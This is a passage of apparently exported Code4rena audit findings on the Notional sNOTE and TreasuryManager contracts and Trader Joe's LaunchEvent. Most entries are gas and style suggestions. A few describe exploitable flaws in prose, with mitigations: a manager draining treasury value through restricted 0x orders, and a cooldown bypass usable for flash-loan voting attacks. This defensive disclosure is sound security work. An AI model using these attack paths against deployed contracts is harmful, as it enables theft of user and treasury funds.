\"Account in Cool Down\"); ```  "}, {"title": "`_validateOrder` Does Not Allow Anyone To Be A Taker Of An Off-Chain Order", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/152", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  The `EIP1271Wallet` contract intends to allow the treasury manager account to sign off-chain orders in 0x on behalf of the `TreasuryManager` contract, which holds harvested assets/`COMP` from Notional. While the `EIP1271Wallet._validateOrder` function mostly prevents the treasury manager from exploiting these orders, it does not ensure that the `takerAddress` and `senderAddress` are set to the zero address. As a result, it is possible for the manager to have sole rights to an off-chain order and due to the flexibility in `makerPrice`, the manager is able to extract value from the treasury by maximising the allowed slippage.  By setting `takerAddress` to the zero address, any user can be the taker of an off-chain order. By setting `senderAddress` to the zero address, anyone is allowed to access the exchange methods that interact with the order, including filling the order itself. Hence, these two order addresses can be manipulated by the manager to effectively restrict order trades to themselves.  ## Proof of Concept  https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange-libs/contracts/src/LibOrder.sol#L66 ``` address takerAddress;           // Address that is allowed to fill the order. If set to 0, any address is allowed to fill the order. ```  https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L196-L250  https://github.com/0xProject/0x-monorepo/blob/0571244e9e84b9ad778bccb99b837dd6f9baaf6e/contracts/exchange/contracts/src/MixinExchangeCore.sol#L354-L374   https://github.com/code-423n4/2022-01-notional/blob/main/contracts/utils/EIP1271Wallet.sol#L147-L188 ``` function _validateOrder(bytes memory order) private view {     (         address makerToken,         address takerToken,         address feeRecipient,         uint256 makerAmount,         uint256 takerAmount     ) = _extractOrderInfo(order);      // No fee recipient allowed     require(feeRecipient == address(0), \"no fee recipient allowed\");      // MakerToken should never be WETH     require(makerToken != address(WETH), \"maker token must not be WETH\");      // TakerToken (proceeds) should always be WETH     require(takerToken == address(WETH), \"taker token must be WETH\");      address priceOracle = priceOracles[makerToken];      // Price oracle not defined     require(priceOracle != address(0), \"price oracle not defined\");      uint256 slippageLimit = slippageLimits[makerToken];      // Slippage limit not defined     require(slippageLimit != 0, \"slippage limit not defined\");      uint256 oraclePrice = _toUint(         AggregatorV2V3Interface(priceOracle).latestAnswer()     );      uint256 priceFloor = (oraclePrice * slippageLimit) /         SLIPPAGE_LIMIT_PRECISION;      uint256 makerDecimals = 10**ERC20(makerToken).decimals();      // makerPrice = takerAmount / makerAmount     uint256 makerPrice = (takerAmount * makerDecimals) / makerAmount;      require(makerPrice >= priceFloor, \"slippage is too high\"); } ```  ## Tools Used  Manual code review. Discussions with Notional team.  ## Recommended Mitigation Steps  Consider adding `require(takerAddress == address(0), \"manager cannot set taker\");` and `require(senderAddress == address(0), \"manager cannot set sender\");` statements to `_validateOrder`. This should allow any user to fill an order and prevent the manager from restricting exchange methods to themselves.  "}, {"title": "TreasuryManager and sNOTE events aren't indexed", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/131", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  hyh   # Vulnerability details    ## Impact  No events in TreasuryManager and sNOTE contracts are indexed, so their filtering is disabled, which makes it harder to programmatically use the system  ## Proof of Concept  TreasuryManager events don't have indices:  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryManager.sol#L38-41  sNOTE events also aren't indexed:  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/sNOTE.sol#L43-50  ## Recommended Mitigation Steps  Consider adding the indices to the key parameters, first of all owner and account addresses   "}, {"title": "Gas in `TreasuryManager.sol`: Inline function `_investWETHToBuyNOTE()`", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/129", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Dravee   # Vulnerability details  Here's the only `_investWETHToBuyNOTE()` call: ``` File: TreasuryManager.sol 140:     function investWETHToBuyNOTE(uint256 wethAmount) external onlyManager { 141:         _investWETHToBuyNOTE(wethAmount); 142:     } ```  While I can understand why some functions have the same style, these other functions are as such because they are calling an inherited function, as an example for `setSlippageLimit()`, which really is calling an inherited function from `EIP1271Wallet.sol`: ``` File: TreasuryManager.sol 89:     function setSlippageLimit(address tokenAddress, uint256 slippageLimit) 90:         external 91:         onlyOwner 92:     { 93:         _setSlippageLimit(tokenAddress, slippageLimit); 94:     } ```  However, for `_investWETHToBuyNOTE()`, this style doesn't hold.   ## Recommended Mitigation Steps All the logic from `_investWETHToBuyNOTE()` should be inlined in `investWETHToBuyNOTE()` to save gas.  "}, {"title": "Gas in `Bitmap.sol:getMSB()`: unnecessary arithmetic operation", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost due to unnecessary arithmetic operation  ## Proof of Concept See the @audit-info tag: ``` File: Bitmap.sol 46:     function getMSB(uint256 x) internal pure returns (uint256 msb) { 47:         // If x == 0 then there is no MSB and this method will return zero. That would 48:         // be the same as the return value when x == 1 (MSB is zero indexed), so instead 49:         // we have this require here to ensure that the values don't get mixed up. 50:         require(x != 0); // dev: get msb zero value 51:         if (x >= 0x100000000000000000000000000000000) { 52:             x >>= 128; 53:             msb += 128; //@audit-info this one and only can be replaced with =  54:         } 55:         if (x >= 0x10000000000000000) { 56:             x >>= 64; 57:             msb += 64; 58:         } 59:         if (x >= 0x100000000) { 60:             x >>= 32; 61:             msb += 32; 62:         } 63:         if (x >= 0x10000) { 64:             x >>= 16; 65:             msb += 16; 66:         } 67:         if (x >= 0x100) { 68:             x >>= 8; 69:             msb += 8; 70:         } 71:         if (x >= 0x10) { 72:             x >>= 4; 73:             msb += 4; 74:         } 75:         if (x >= 0x4) { 76:             x >>= 2; 77:             msb += 2; 78:         } 79:         if (x >= 0x2) msb += 1; // No need to shift xc anymore 80:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps On line 53, and only there, it is absolutely certain that `+=` can be replaced with `=`, which would look like this: ``` 53:             msb = 128; ```  "}, {"title": "`BalanceHandler.sol:getBalanceStorage()`: `store` is used only once and shouldn't get cached", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/125", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept `store` is a variable used only once. A comment should suffice instead of a variable (see @audit-info): ``` File: BalanceHandler.sol 72:         mapping(address => mapping(uint256 => BalanceStorage)) storage store = LibStorage.getBalanceStorage(); //@audit-info store is used only once, below 73:         BalanceStorage storage balanceStorage = store[account][currencyId]; ``` ## Tools Used VS Code  ## Recommended Mitigation Steps Do not store this data in a variable. Inline it instead: ``` BalanceStorage storage balanceStorage = LibStorage.getBalanceStorage()[account][currencyId]; ```    "}, {"title": "Remove unnecessary super._beforeTokenTransfer()", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/112", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The sNOTE.sol `_beforeTokenTransfer()` function overrides the ERC20 `_beforeTokenTransfer()` function, but also calls `super._beforeTokenTransfer()`. This call to the parent function is unnecessary because no actions are performed, so it can be removed to save gas. This function call is probably placed here for consistency with the `_afterTokenTransfer()` function, but it is unnecessary with the current code (unlike the call in the `_afterTokenTransfer()` function)  ## Proof of Concept  [Line 374 of sNOTE.sol](https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L374) calls super._beforeTokenTransfer(), which does not need to be called because it performs no actions.  ## Recommended Mitigation Steps  Remove line 374 from sNOTE.sol to remove the `super._beforeTokenTransfer()` call   "}, {"title": "Revert string > 32 bytes", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/110", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Strings are broken into 32 byte chunks for operations. Revert error strings over 32 bytes therefore consume extra gas as [documented publicly](https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b)  ## Proof of Concept  There are multiple examples of this gas optimization opportunity, including but not limited to: - TreasuryAction.sol [line 41](https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/TreasuryAction.sol#L41)  ## Recommended Mitigation Steps  Reducing revert error strings to under 32 bytes decreases deployment time gas and runtime gas when the revert condition is met. Alternatively, the code could be modified to use custom errors, introduced in Solidity 0.8.4: https://blog.soliditylang.org/2021/04/21/custom-errors/  "}, {"title": "setReserveCashBalance can only set less reserves", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/103", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  GeekyLumberjack   # Vulnerability details  ## Impact There is a fairly decent chance that setReserveCashBalance will mistakenly be set too low. Unlike the case for addresses, the number required is more likely to be manually typed. This will lead to higher chance of a mistype causing unusable reserves. With some functions risks like these are unavoidable. However, in this case, the actions are already performed with a trusted party.  ## Proof of Concept 1. call [setReserveCashBalance()](https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L80-L91) with the newBalance parameter set to 1. 2. call setReserveCashBalance() with newBalance parameter set to 100. 3. balanceStorage.cashBalance will still be set to 1. Step 2 would have reverted due to `require(newBalance < reserveBalance, \"cannot increase reserve balance\");`  ## Tools Used Manual Analysis  ## Recommended Mitigation Step Consider removing `require(newBalance < reserveBalance, \"cannot increase reserve balance\");`  https://github.com/code-423n4/2022-01-notional/blob/main/contracts/TreasuryAction.sol#L88   "}, {"title": "Gas: When a function use the `onlyOwner` modifier, use `msg.sender` instead of `owner`", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact `msg.sender` costs 2 gas (CALLER opcode) `owner` costs 100 gas (SLOAD opcode) The `onlyOwner` modifier already checks that `msg.sender == owner`.  ## Proof of Concept Instances include: ``` contracts\\sNOTE.sol:118:            payable(owner), // Owner will receive the NOTE and WETH contracts\\TreasuryManager.sol:108:        IERC20(token).safeTransfer(owner, amount); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps When a function use the `onlyOwner` modifier, use `msg.sender` instead of `owner`  "}, {"title": "Gas: Missing checks for non-zero transfer value calls", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/94", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Checking non-zero transfer values can avoid an external call to save gas.      ## Proof of Concept   Instances missing a non-zero check on amount transfered:   ```   contracts\\sNOTE.sol:142:        BALANCER_POOL_TOKEN.safeTransferFrom(msg.sender, address(this), bptAmount); contracts\\sNOTE.sol:150:        NOTE.safeTransferFrom(msg.sender, address(this), noteAmount); contracts\\sNOTE.sol:178:        WETH.safeTransferFrom(msg.sender, address(this), wethAmount); contracts\\sNOTE.sol:251:        BALANCER_POOL_TOKEN.safeTransfer(msg.sender, bptToRedeem); contracts\\TreasuryAction.sol:113:        COMP.safeTransfer(treasuryManagerContract, amountClaimed); contracts\\TreasuryAction.sol:140:        IERC20(underlyingAddress).safeTransfer(treasuryManagerContract, redeemedExternalUnderlying); contracts\\TreasuryManager.sol:108:        IERC20(token).safeTransfer(owner, amount); ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Check if transfer amount > 0.   "}, {"title": "Conversions between sNOTE and BPT when burning cause less sNOTE to be burned than expected", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/71", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  `sNOTE.redeem` burns an amount of sNOTE other than `sNOTEAmount`, potentially giving a better rate to redeemers than it should.  ## Proof of Concept  Following the process of burning sNOTE for BPT:  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L238-L252  1. We pass an amount of sNOTE to burn which is converted into BPT. (L248)  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L315-L323  2. We calculate the what fraction of the total amount of BPT this user is entitled to this amount of BPT represents and then multiply that by their balance of sNOTE (L320)  Rather than burning `sNOTEAmount` we then end up burning   ``` realSNOTEAmount = balanceOf(account) * getPoolTokenShare(sNOTEAmount) / getPoolTokenShare(balanceOf(account)) ```  This looks to round down such that we end up burning less sNOTE than expected. We're then going to be giving the user a slightly better rate of BPT for sNOTE than we should whereas any rounding should be in favour of the sNOTE contract.  In any case, we're performing many reads from storage (including from other contracts) in order to calculate a value which was originally passed by the user so using `sNOTEAmount` directly would be a gas optimisation.  ## Recommended Mitigation Steps  Change `_burn` to take an amount of sNOTE to burn as an argument rather than an amount of BPT which is equivalent to the amount of sNOTE to be burnt. `sNOTEAmount` can then be passed from the `redeem` function directly. `bptToRedeem` will still be rounded down so sNOTE will always have favourable rounding.  "}, {"title": "Cooldown and redeem windows can be rendered useless.", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/68", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  ShippooorDAO   # Vulnerability details  ## Impact Cooldown and redeem windows can be rendered useless.  ## Proof of Concept - Given an account that has not staked sNOTE. - Account calls sNOTE.startCooldown - Account waits for the duration of the cooldown period. Redeem period starts. - Account can then deposit and redeem as they wish, making the cooldown useless. - Multiple accounts could be used to \"hop\" between redeem windows by transfering between them, making the redeem window effictively useless.  Could be used for voting power attacks using flash loan if voting process is not monitored  https://www.coindesk.com/tech/2020/10/29/flash-loans-have-made-their-way-to-manipulating-protocol-elections/  ## Tools Used - Eyes - Brain - VS Code  ## Recommended Mitigation Steps A few ways to mitigate this problem: Option A: Remove the cooldown/redeem period as it's not really preventing much in current state. Option B: Let the contract start the cooldown on mint, and bind the cooldown/redeem window to the amount that was minted at that time by the account. Don't make sNOTE.startCooldown() available externally. Redeem should verify amount of token available using this new logic.  "}, {"title": "`_investWETHToBuyNOTE` is unnecessarily roundabout.", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Gas costs  ## Proof of Concept  TreasuryManager has a `_investWETHToBuyNOTE` function which deposits WETH stored on the contract into the NOTE-WETH Balancer pool.  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/TreasuryManager.sol#L168-L211  Note there's a bit of a disconnect between the function name and what it's actually doing. You could argue that you're buying NOTE as you'll end up with an 80% note position but I think it's  more helpful for the purposes of this function to think of it as a \"trade\" of WETH for BPT.  The current function is as so: ``` IPriceOracle.OracleAverageQuery[] memory queries = new IPriceOracle.OracleAverageQuery[](1);  queries[0].variable = IPriceOracle.Variable.PAIR_PRICE; queries[0].secs = 3600; // last hour queries[0].ago = 0; // now  // Gets the balancer time weighted average price denominated in ETH uint256 noteOraclePrice = IPriceOracle(address(BALANCER_POOL_TOKEN))     .getTimeWeightedAverage(queries)[0];  BALANCER_VAULT.joinPool(     NOTE_ETH_POOL_ID,     address(this),     sNOTE, // sNOTE will receive the BPT     IVault.JoinPoolRequest(         assets,         maxAmountsIn,         abi.encode(             IVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,             maxAmountsIn,             0 // Accept however much BPT the pool will give us         ),         false // Don't use internal balances     ) );  uint256 noteSpotPrice = _getNOTESpotPrice();  // Calculate the max spot price based on the purchase limit uint256 maxPrice = noteOraclePrice +     (noteOraclePrice * notePurchaseLimit) /     NOTE_PURCHASE_LIMIT_PRECISION; ```  In this function we query the recent price average between NOTE and ETH, perform an unconditional join and then check that the spot price of NOTE in terms of ETH is below some maximum value to ensure that the pool's balances haven't been manipulated such that ETH is being undervalued.  This seems like a fairly roundabout method to set a slippage limit on a join which would be simpler if we queried the exchange rate between BPT and WETH. That allows us to specify a minimum amount of BPT we'd accept.  We'd then avoid using the function `_getNOTESpotPrice` entirely and could save the costs of querying the pool's balances again.  ## Recommended Mitigation Steps  Consider changing to something along the lines of  ``` IPriceOracle.OracleAverageQuery[] memory queries = new IPriceOracle.OracleAverageQuery[](1);  // Note we're querying the BPT price rather than the pair price now queries[0].variable = IPriceOracle.Variable.BPT_PRICE; queries[0].secs = 3600; // last hour queries[0].ago = 0; // now  // Gets the balancer time weighted average price denominated in ETH uint256 bptOraclePrice = IPriceOracle(address(BALANCER_POOL_TOKEN))     .getTimeWeightedAverage(queries)[0];  uint256 minBptOut = (bptOraclePrice * notePurchaseLimit) /  NOTE_PURCHASE_LIMIT_PRECISION;  BALANCER_VAULT.joinPool(     NOTE_ETH_POOL_ID,     address(this),     sNOTE, // sNOTE will receive the BPT     IVault.JoinPoolRequest(         assets,         maxAmountsIn,         abi.encode(             IVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,             maxAmountsIn,             minBptOut         ),         false // Don't use internal balances     ) ); ```  We're directly enforcing a slippage limit on the WETH -> BPT conversion rather than doing it in a roundabout way so it's easier to reason about. We save having to query the pool's balances again so save gas and also in the case where the slippage limit is triggered it'll be hit earlier, again saving gas.  "}, {"title": "Unnecessary inheritance messing with inheritance tree.", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Extra boilerplate code (including the whole of the _afterTokenTransfer function)  ## Proof of Concept  sNOTE inherits from both ERC20Upgradeable and ERC20VotesUpgradeable.  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L15  This causes us to have to add explicit helpers for how to handle the inheritance tree to a bunch of functions  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L315  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L328  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L362  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L381  If we look at OZ however, we can see that ERC20VotesUpgradeable inherits from ERC20PermitUpgradeable which in turn inherits from ERC20Upgradeable   https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC20/extensions/ERC20VotesUpgradeable.sol#L28  https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/fd165faaf00587377b5ab93be3cafb4ffdc96976/contracts/token/ERC20/extensions/draft-ERC20PermitUpgradeable.sol#L23  There's then no real reason for sNOTE to inherit from ERC20Upgradeable directly. Removing this inheritance should allow you to remove a bunch of the explicit overrides you have.  ## Recommended Mitigation Steps  Remove direct inheritance of ERC20Upgradeable and remove all the `override(ERC20Upgradeable, ERC20VotesUpgradeable)` stuff. You should be able to just delete `_afterTokenTransfer` in its entirety.  "}, {"title": "Initialisation of zero entries in arrays is unnecessary", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Gas costs. ## Proof of Concept  In a number of places we create an array and then fill every element with zero. There's no need to do this as a newly declared array will have zero-valued elements by default. We can then avoid the costs of writing a new zero to them.  For example we could remove these three lines entirely: https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L111-L113  We can then just pass an empty array in the lines below as so. ``` BALANCER_VAULT.exitPool(   NOTE_ETH_POOL_ID,   address(this),   payable(owner), // Owner will receive the NOTE and WETH   IVault.ExitPoolRequest(       assets,       new uint256[](2), // inlined here       abi.encode(           IVault.ExitKind.EXACT_BPT_IN_FOR_TOKENS_OUT,           bptExitAmount       ),       false // Don't use internal balances   ) ); ```  This also crops up elsewhere: https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L156 https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L169 https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L185  ## Tools Used  ## Recommended Mitigation Steps  Omit lines writing zeros to an empty array.  "}, {"title": "Placement of require statement", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/55", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  Jujic   # Vulnerability details  ## Impact The require statement can be placed earlier (`before get coolDown`) to reduce gas usage.   ## Proof of Concept https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L240 ``` function redeem(uint256 sNOTEAmount) external nonReentrant {         AccountCoolDown memory coolDown = accountCoolDown[msg.sender];         require(sNOTEAmount <= balanceOf(msg.sender), \"Insufficient balance\");         require(             coolDown.redeemWindowBegin != 0 &&             coolDown.redeemWindowBegin < block.timestamp &&             block.timestamp < coolDown.redeemWindowEnd,             \"Not in Redemption Window\"         );          uint256 bptToRedeem = getPoolTokenShare(sNOTEAmount);         _burn(msg.sender, bptToRedeem);          BALANCER_POOL_TOKEN.safeTransfer(msg.sender, bptToRedeem);     } ``` ## Tools Used Remix ## Recommended Mitigation Steps Relocate the require statement upper.  "}, {"title": "coolDown.redeemWindowEnd serves no purpose", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Increases gas costs due to manipulating redeemWindowEnd and usage of structs for `AccountCooldown`  ## Proof of Concept  `redeemWindowEnd` will always equal `redeemWindowBegin + REDEEM_WINDOW_SECONDS` so it can just be calculated when needed (excluding the situation where both of these are zero which is already handled in the code.)  We then don't need to store both of these values in storage and deal with the overhead of using structs.  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L244  We can then just replace this line with   ``` block.timestamp < coolDown.redeemWindowBegin + REDEEM_WINDOW_SECONDS ```  ## Recommended Mitigation Steps  Remove `coolDown.redeemWindowEnd` and store cooldowns as a simple uint rather than a struct.  "}, {"title": "Comment refers to NOTE when it means WETH", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/42", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  ## Proof of Concept  This comment should refer to WETH not NOTE  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L177  ## Recommended Mitigation Steps  Change to refer to WETH  "}, {"title": "`mintFromNOTE`, `mintFromETH` and `mintFromWETH` can be merged into two functions to give users better experience.", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Greater flexibility for users and better conversion between a mix of ETH/NOTE and sNOTE.  ## Proof of Concept  `sNOTE` allows users to provider either NOTE, ETH or WETH to provide liquidity in return for BPT to mint sNOTE with through the functions `mintFromNOTE`, `mintFromETH` and `mintFromWETH`.  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/sNOTE.sol#L146-L188  Balancer allows users to deposit multiple assets at once so the same functionality while being more flexible (by allowing deposits in both NOTE and ETH at the same time) and giving users better execution (A user depositing NOTE and ETH together gets more SNOTE than one who deposits NOTE and then ETH afterwards)  Consider the code snippet:  ``` /// @notice Mints sNOTE from some amount of NOTE and ETH /// @param noteAmount amount of NOTE to transfer into the sNOTE contract function mintFromETH(uint256 noteAmount) payable external nonReentrant {     IAsset[] memory assets = new IAsset[](2);     assets[0] = IAsset(address(0));     assets[1] = IAsset(address(NOTE));     uint256[] memory maxAmountsIn = new uint256[](2);     maxAmountsIn[0] = msg.value;     maxAmountsIn[1] = noteAmount;      _mintFromAssets(assets, maxAmountsIn); }  /// @notice Mints sNOTE from some amount of NOTE and WETH /// @param wethAmount amount of WETH to transfer into the sNOTE contract /// @param noteAmount amount of NOTE to transfer into the sNOTE contract function mintFromWETH(uint256 wethAmount, uint256 noteAmount) external nonReentrant {     // Transfer the WETH and NOTE balance into sNOTE first     WETH.safeTransferFrom(msg.sender, address(this), wethAmount);     NOTE.safeTransferFrom(msg.sender, address(this), noteAmount);      IAsset[] memory assets = new IAsset[](2);     assets[0] = IAsset(address(WETH));     assets[1] = IAsset(address(NOTE));     uint256[] memory maxAmountsIn = new uint256[](2);     maxAmountsIn[0] = wethAmount;     maxAmountsIn[1] = noteAmount;      _mintFromAssets(assets, maxAmountsIn); } ```  ## Recommended Mitigation Steps  Replace current functions with above versions  "}, {"title": "Require statement on nonzero pool address is impossible to fail ", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Extra gas costs ## Proof of Concept  Here we check that `_noteETHPoolId` corresponds to a registered Balancer pool.  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/TreasuryManager.sol#L59  `_balancerVault.getPool(_noteETHPoolId)` will revert if _noteETHPoolId is not a registered poolId  https://github.com/balancer-labs/balancer-v2-monorepo/blob/3c1c362adb1fa003cc33f64da93a2e286b5a1257/pkg/vault/contracts/PoolRegistry.sol#L93  https://github.com/balancer-labs/balancer-v2-monorepo/blob/3c1c362adb1fa003cc33f64da93a2e286b5a1257/pkg/vault/contracts/PoolRegistry.sol#L56  The require statement on the next line is impossible to fail unless we somehow manage to deploy a balancer pool to the zero address (which would be impressive)  https://github.com/code-423n4/2022-01-notional/blob/d171cad9e86e0d02e0909eb66d4c24ab6ea6b982/contracts/TreasuryManager.sol#L60  We can then safely remove this statement without any change in behaviour.  ## Recommended Mitigation Steps  Remove require statement.  "}, {"title": "_getToken not resilient to errors", "html_url": "https://github.com/code-423n4/2022-01-notional-findings/issues/36", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2022-01-notional-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact `_getToken` return empty values instead of revert.  ## Proof of Concept The library `TokenHandler` has the `_getToken` method and this method returns an empty struct instead of revert if the currencyId was not found, this can produce in unexpected errors.  ## Tools Used Manual review.  ## Recommended Mitigation Steps revert if it was not found.  "}, {"title": "Cheaper operation should be done first in an if statement", "html_url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/319", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-trader-joe-findings", "body": "# Handle  pedroais   # Vulnerability details  ## Impact Save gas ## Proof of Concept The cheaper operation should be done first to save gas . auctionStart == 0 is cheaper than block.timestamp < auctionStart  https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/LaunchEvent.sol#L291     "}, {"title": "Gas Optimziation: Unnecessary pairBalance call", "html_url": "https://github.com/code-423n4/2022-01-trader-joe-findings/issues/310", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-trader-joe-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact If `msg.sender == issuer`, we don't need to call `pairBalance(msg.sender)` https://github.com/code-423n4/2022-01-trader-joe/blob/a1579f6453bc4bf9fb0db9c627beaa41135438ed/contracts/LaunchEvent.sol#L447 ```         uint256 balance = pairBalance(msg.sender);         user.hasWithdrawnPair = true;          if (msg.sender == issuer) {             balance = lpSupply / 2;              emit IssuerLiquidityWithdrawn(msg.sender, address(pair), balance);              if (tokenReserve > 0) {                 uint256 amount = tokenReserve;                 tokenReserve = 0;                 token.transfer(msg.sender, amount);             }         } else {             emit UserLiquidityWithdrawn(msg.sender, address(pair), balance);         } ``` to ```         uint256 balance;         user.hasWithdrawnPair = true;          if (msg.sender == issuer) {             balance = lpSupply / 2;              emit IssuerLiquidityWithdrawn(msg.sender, address(pair), balance);              if (tokenReserve > 0) {                 uint256 amount = tokenReserve;                 tokenReserve = 0;                 token.transfer(msg.sender, amount);             }         } else 